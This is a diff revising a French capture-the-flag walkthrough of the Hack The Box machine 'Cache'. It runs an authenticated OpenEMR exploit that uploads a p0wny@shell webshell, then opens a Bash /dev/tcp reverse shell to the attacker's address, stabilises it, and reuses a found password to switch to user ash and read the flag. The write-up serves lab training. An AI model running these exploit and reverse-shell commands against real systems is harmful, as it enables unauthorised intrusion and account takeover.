@@ -1160,7 +1160,7 @@ Champ mot de passe : clearPass
 Marqueur d’échec   : error=1
 ```
 
-### Attaque par dictionnaire avec Hydra
+#### Attaque par dictionnaire avec Hydra
 
 Avant de préparer l’attaque par dictionnaire, tu reviens donc dans le répertoire de travail `hms` :
 
@@ -1299,86 +1299,52 @@ Le mot de passe découvert avec Hydra n’est toutefois pas accepté. Le compte 
 
 Tu disposes désormais des identifiants nécessaires pour tester les exploits OpenEMR authentifiés `49998.py` et `45161.py`.
 
-### Analyse des exploits authentifiés
+### Analyse de l’exploit `49998.py`
 
-Tu peux donc passer à l’étude des deux exploits authentifiés retenus précédemment :
-
-```txt
-49998.py — OpenEMR 5.0.1.3 - 'manage_site_files' Remote Code Execution (Authenticated)
-45161.py — OpenEMR 5.0.1.3 - Remote Code Execution (Authenticated)
-```
-
-Comme pour `50017.py`, tu vas commencer par examiner leur code source afin de comprendre leur fonctionnement, les chemins qu’ils ciblent et les paramètres qu’ils attendent avant de les exécuter.
-
-Il est préférable d’isoler les deux exploits dans des sous-répertoires distincts. Cette organisation permet de conserver séparément les scripts originaux, leurs éventuelles versions adaptées et les résultats obtenus lors des différents tests.
-
-Tu te places d’abord dans le répertoire de travail `hms` :
+Tu te trouves actuellement dans le répertoire de travail `hms`. Tu crées un sous-répertoire consacré à l’exploit `49998.py`, puis tu y copies le script avec `searchsploit` :
 
 ```bash
-cd hms
-```
-
-Tu crées ensuite un sous-répertoire pour chacun des deux exploits, puis tu y copies les scripts correspondants :
-
-```bash
-mkdir -p 49998 45161
-
+mkdir -p 49998
 cd 49998
+
 searchsploit -m php/webapps/49998.py
-
-cd ../45161
-searchsploit -m php/webapps/45161.py
 ```
 
-L’arborescence de travail contient maintenant un répertoire distinct pour chaque exploit :
+Le fichier est maintenant disponible dans le répertoire courant :
 
-```
-hms/
-├── 49998/
-│   └── 49998.py
-└── 45161/
-    └── 45161.py
+```text
+49998.py
 ```
 
-Tu peux commencer par analyser `49998.py`, puis examiner `45161.py` si la première tentative ne permet pas d’obtenir une exécution de commandes exploitable.
-
-
-
-#### Analyse de l’exploit `49998.py`
-
-Tu commences par te placer dans le répertoire dédié à l’exploit :
+Avant de l’exécuter, tu affiches son code source dans un éditeur de texte afin d’en examiner l’en-tête, les commentaires et les différentes étapes de l’exploitation :
 
 ```bash
-cd hms/49998
+nano 49998.py
 ```
-
-
-
-Comme pour l’exploit précédent, la première étape consiste à examiner le code source de `49998.py` afin de comprendre précisément son fonctionnement avant de l’exécuter.
 
 L’en-tête indique que le script exploite la vulnérabilité suivante :
 
-```txt
+```text
 CVE-2018-15139
 ```
 
-Le script s’authentifie avec un compte OpenEMR valide, puis tente d’utiliser la page suivante :
+Le script commence par s’authentifier auprès d’OpenEMR avec un compte valide. Il tente ensuite d’accéder à la page suivante :
 
-```url
+```text
 /interface/super/manage_site_files.php
 ```
 
-Cette fonctionnalité permet normalement de gérer les fichiers du site. L’exploit cherche à en abuser pour envoyer une webshell nommée :
+Cette fonctionnalité permet normalement de gérer certains fichiers du site. L’exploit cherche à en abuser afin d’envoyer une webshell PHP nommée :
 
-```txt
+```text
 shell.php
 ```
 
-Le code contient directement une webshell complète de type `p0wny@shell`, qui doit être déposée dans le répertoire des images du site par défaut.
+Le code du script contient directement une webshell complète de type `p0wny@shell`.
 
-Si l’envoi réussit, le script prévoit de rendre la webshell accessible à l’adresse suivante :
+Si l’envoi réussit, le fichier doit être déposé dans le répertoire des images du site OpenEMR par défaut et devenir accessible à l’adresse suivante :
 
-```url
+```text
 http://hms.htb/sites/default/images/shell.php
 ```
 
@@ -1388,15 +1354,16 @@ Avant de lancer l’exploitation, tu affiches l’aide du script afin d’identi
 python3 49998.py -h
 ```
 
-Ce qui donne :
+La commande retourne :
 
-```bash
+```text
 /hms/49998/49998.py:25: SyntaxWarning: invalid escape sequence '\ '
   / _ \ _ __   ___ _ __ | ____|  \/  |  _ \          | ___| / _ \ / | |___ /
 
  ___                   _____ __  __ ____            ____   ___   _   _____
   / _ \ _ __   ___ _ __ | ____|  \/  |  _ \          | ___| / _ \ / | |___ /
- | | | | '_ \ / _ \ '_ \|  _| | |\/| | |_) |  _____  |___ \| | | || |   |_  | |_| | |_) |  __/ | | | |___| |  | |  _ <  |_____|  ___) | |_| || |_ ___) |
+ | | | | '_ \ / _ \ '_ \|  _| | |\/| | |_) |  _____  |___ \| | | || |   |_  |
+ | |_| | |_) |  __/ | | | |___| |  | |  _ <  |_____|  ___) | |_| || |_ ___) |
   \___/| .__/ \___|_| |_|_____|_|  |_|_| \_\         |____(_)___(_)_(_)____/
        |_|
 
@@ -1406,7 +1373,6 @@ Ce qui donne :
                     | |___ >  <| |_) | | (_) | | |_
                     |_____/_/\_\ .__/|_|\___/|_|\__|
                                |_|
-
 
 usage: 49998.py [-h] [-T IP] [-P PORT] [-U PATH] [-u USERNAME] [-p PASSWORD]
 
@@ -1419,14 +1385,13 @@ options:
   -U, --PATH PATH
   -u, --USERNAME USERNAME
   -p, --PASSWORD PASSWORD
- 
 ```
 
-L’avertissement `SyntaxWarning` concerne uniquement une séquence d’échappement présente dans la bannière ASCII du script. Il n’empêche pas l’affichage de l’aide ni, a priori, son exécution.
+L’avertissement `SyntaxWarning` concerne uniquement une séquence d’échappement présente dans la bannière ASCII du script. Il n’empêche pas l’affichage de l’aide.
 
-Les paramètres attendus sont :
+Les paramètres attendus sont les suivants :
 
-```
+```text
 -T  adresse ou nom d’hôte de la cible
 -P  port HTTP
 -U  chemin de base de l’installation OpenEMR
@@ -1434,9 +1399,9 @@ Les paramètres attendus sont :
 -p  mot de passe OpenEMR
 ```
 
-Dans notre cas, l’installation OpenEMR est accessible directement à la racine de `hms.htb`. Le paramètre `-U` pourra donc recevoir une valeur vide.
+Dans notre cas, OpenEMR est directement accessible à la racine de `hms.htb`. Le paramètre `-U` peut donc recevoir une valeur vide.
 
-La commande d’exploitation prendra ainsi la forme suivante :
+La commande d’exploitation prend ainsi la forme suivante :
 
 ```bash
 python3 49998.py \
@@ -1444,21 +1409,16 @@ python3 49998.py \
   -P 80 \
   -U '' \
   -u openemr_admin \
-  -p '<mot_de_passe_trouvé>'
+  -p 'xxxxxx'
 ```
 
+Le script s’authentifie avec le compte `openemr_admin`, puis exploite la fonctionnalité `manage_site_files.php` afin d’envoyer une webshell nommée `shell.php` dans le répertoire des images du site OpenEMR.
 
-
-Le résultat montre que l’exploitation avec `49998.py` fonctionne finalement sur la cible : la webshell est accessible et permet d’exécuter des commandes en tant que `www-data`.
-
-Tu peux poursuivre le writeup ainsi :
-
-```
-L’exploit s’authentifie avec le compte `openemr_admin`, puis envoie une webshell `p0wny@shell` dans le répertoire des images du site OpenEMR.
+Cette webshell utilise **p0wny@shell**, une interface PHP légère qui s’ouvre dans le navigateur et permet d’exécuter des commandes système sur le serveur distant. Elle fournit ainsi un accès en ligne de commande depuis une simple page web, avec les privilèges du compte utilisé par le serveur HTTP.
 
 Le script indique que la webshell doit être accessible à l’adresse suivante :
 
-```text
+```url
 http://hms.htb/sites/default/images/shell.php
 ```
 
@@ -1466,17 +1426,17 @@ En ouvrant cette URL dans le navigateur, tu obtiens bien l’interface de la web
 
 ![Webshell p0wny@shell exécutant la commande id en tant que www-data](cache-htb-hms-htb-p0wny-shell.png)
 
+L’envoi a bien fonctionné : l’interface de `p0wny@shell` s’affiche et permet d’exécuter des commandes sur la cible.
 
+Pour vérifier sous quel compte les commandes sont exécutées, tu saisis :
 
-Pour vérifier l’exécution de commandes, tu lances :
-
-```
+```bash
 id
 ```
 
 La réponse confirme que les commandes sont exécutées avec les privilèges de l’utilisateur du serveur web :
 
-```
+```bash
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
@@ -1484,26 +1444,42 @@ L’exploit `49998.py` permet donc d’obtenir directement une exécution de com
 
 ### Identification des utilisateurs locaux
 
-Depuis la webshell, tu examines le contenu du répertoire `/home` :
+Depuis la webshell, tu examines le contenu du répertoire `/home` afin d’identifier les comptes locaux présents sur la machine :
 
-```
+```bash
 ls -l /home
+```
+
+La commande retourne :
+
+```text
 total 8
 drwxr-xr-x 11 ash   ash   4096 May  6  2020 ash
 drwxr-x---  5 luffy luffy 4096 May  6  2020 luffy
 ```
 
-Deux utilisateurs locaux sont présents sur la machine :
+Deux utilisateurs locaux possèdent donc un répertoire personnel :
 
-```
+```text
 ash
 luffy
 ```
 
-Le répertoire personnel de `ash` est accessible en lecture. Tu peux donc en examiner le contenu :
+Le répertoire de `luffy` n’est accessible qu’à son propriétaire et aux membres de son groupe :
 
+```text
+drwxr-x--- 5 luffy luffy
 ```
+
+En revanche, les permissions du répertoire de `ash` permettent à `www-data` d’en consulter le contenu. Tu l’énumères donc avec :
+
+```bash
 ls -l /home/ash
+```
+
+La sortie obtenue est la suivante :
+
+```text
 total 28
 drwxrwxr-x 2 root root 4096 May  5  2020 Desktop
 drwxrwxr-x 2 root root 4096 Oct  9  2019 Documents
@@ -1514,37 +1490,47 @@ drwxrwxr-x 2 root root 4096 Oct  9  2019 Public
 -r-x------ 1 ash  ash    33 Jul 31 08:11 user.txt
 ```
 
-Le fichier `user.txt` est bien présent, mais ses permissions montrent qu’il ne peut être lu que par `ash` :
+Le fichier `user.txt` est bien présent, mais ses permissions montrent qu’il ne peut être lu que par son propriétaire :
 
-```
+```text
 -r-x------ 1 ash ash 33 Jul 31 08:11 user.txt
 ```
 
 L’accès obtenu en tant que `www-data` ne suffit donc pas encore pour lire le flag utilisateur.
 
-Les identifiants `ash:H@v3_fun`, découverts au début de l’énumération, n’ont encore permis ni une connexion SSH ni un accès à OpenEMR. Comme le fichier `user.txt` appartient à `ash`, c’est le moment de tester une réutilisation de ce mot de passe directement depuis la machine :
+Les identifiants suivants, découverts au début de l’énumération, n’ont jusqu’à présent permis ni une connexion SSH ni un accès à OpenEMR :
 
+```text
+ash:H@v3_fun
 ```
+
+La présence d’un compte local nommé `ash` donne toutefois une nouvelle raison de tester une éventuelle réutilisation de ce mot de passe directement depuis la machine compromise.
+
+Depuis la webshell, tu essaies donc de basculer vers cet utilisateur :
+
+```bash
 su - ash
 ```
 
-La tentative échoue toutefois avec le message suivant :
+La tentative échoue avec le message suivant :
 
-```
+```text
 su: must be run from a terminal
 ```
 
-La webshell p0wny@shell permet bien d’exécuter des commandes, mais elle ne fournit pas de véritable terminal interactif. Il faut donc obtenir un reverse shell avant de pouvoir utiliser correctement `su`.
+Cette erreur ne signifie pas que le mot de passe est incorrect. Elle indique que `su` exige un véritable terminal interactif pour demander et lire le mot de passe.
+
+La webshell `p0wny@shell` permet d’exécuter des commandes, mais elle ne fournit pas ce type de terminal. Il faut donc obtenir un reverse shell avant de pouvoir réessayer correctement la commande `su`.
 
 ### Obtention d’un reverse shell en tant que `www-data`
 
-Tu commences par lancer un listener sur Kali :
+Pour obtenir un shell plus interactif que la webshell `p0wny@shell`, tu commences par lancer un listener sur Kali :
 
 ```bash
 rlwrap -cAr nc -lvnp 4444
 ```
 
-Depuis p0wny@shell, tu exécutes ensuite un reverse shell Bash vers l’adresse IP de l’interface `tun0` de Kali :
+Depuis `p0wny@shell`, tu exécutes ensuite un reverse shell Bash vers l’adresse IP de l’interface `tun0` de Kali :
 
 ```bash
 bash -c 'bash -i >& /dev/tcp/10.10.15.96/4444 0>&1'
@@ -1552,17 +1538,21 @@ bash -c 'bash -i >& /dev/tcp/10.10.15.96/4444 0>&1'
 
 Le listener reçoit alors une connexion depuis la cible :
 
-```bash
+```text
 connect to [10.10.15.96] from [10.129.x.x]
 ```
 
 Tu obtiens un shell en tant que `www-data` :
 
-```bash
+```text
 www-data@cache:/var/www/hms.htb/public_html/sites/default/images$
 ```
 
-Ce shell reste encore rudimentaire. Tu le stabilises d’abord avec Python :
+Ce shell reste encore rudimentaire et doit être stabilisé pour obtenir un terminal suffisamment interactif en te basant sur la recette :
+
+{{< recette "stabiliser-reverse-shell" >}}
+
+Tu commences par créer un pseudo-terminal avec Python :
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
@@ -1570,36 +1560,38 @@ python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 Tu places ensuite le shell en arrière-plan avec :
 
-```
+```text
 Ctrl+Z
 ```
 
-Puis, dans ton terminal Kali, tu exécutes :
+Puis, dans le terminal Kali, tu exécutes :
 
 ```bash
 stty raw -echo
 fg
 ```
 
-De retour dans le reverse shell, tu réinitialises le terminal :
+De retour dans le shell distant, tu réinitialises le terminal :
 
 ```bash
 reset
 ```
 
-Lorsque le type de terminal est demandé, tu réponds :
+Lorsque `reset` demande le type de terminal, tu réponds :
 
-```bash
+```text
 xterm
 ```
 
-Enfin, tu définis explicitement la variable `TERM` :
+Enfin, tu définis explicitement la variable d’environnement `TERM` :
 
 ```bash
 export TERM=xterm
 ```
 
-Tu disposes maintenant d’un terminal suffisamment interactif pour réessayer le passage vers le compte `ash`.
+### Passage à l’utilisateur `ash`
+
+Tu disposes maintenant d’un terminal suffisamment interactif pour réessayer le passage vers le compte `ash` :
 
 ```bash
 su - ash
@@ -1607,34 +1599,38 @@ su - ash
 
 Lorsque le mot de passe est demandé, tu saisis celui découvert au début de l’énumération :
 
-```
+```text
 H@v3_fun
 ```
 
 Cette fois, l’authentification réussit et tu obtiens un shell sous le compte `ash` :
 
-```
+```text
 ash@cache:~$
 ```
 
-Tu peux vérifier ton identité avec :
+Tu vérifies ton identité avec :
 
-```
+```bash
 id
+```
+
+La sortie confirme que tu es maintenant connecté sous le compte `ash` :
+
+```text
 uid=1000(ash) gid=1000(ash) groups=1000(ash)
-
 ```
 
+### Lecture du flag `user.txt`
 
+Tu peux enfin lire le flag utilisateur :
 
-Puis lire le flag utilisateur :
-
-```
+```bash
 cat /home/ash/user.txt
 8e33xxxxxxxxxxxxxxxxxxxxxxxxxx097b
 ```
 
-La partie **Prise pied** s’arrête ici, avec l’obtention du shell de `ash` et la lecture de `user.txt`.
+La partie **Prise pied** s’achève ici, avec l’obtention d’un shell sous le compte `ash` et la lecture de `user.txt`.
 
 ## Escalade de privilèges
 
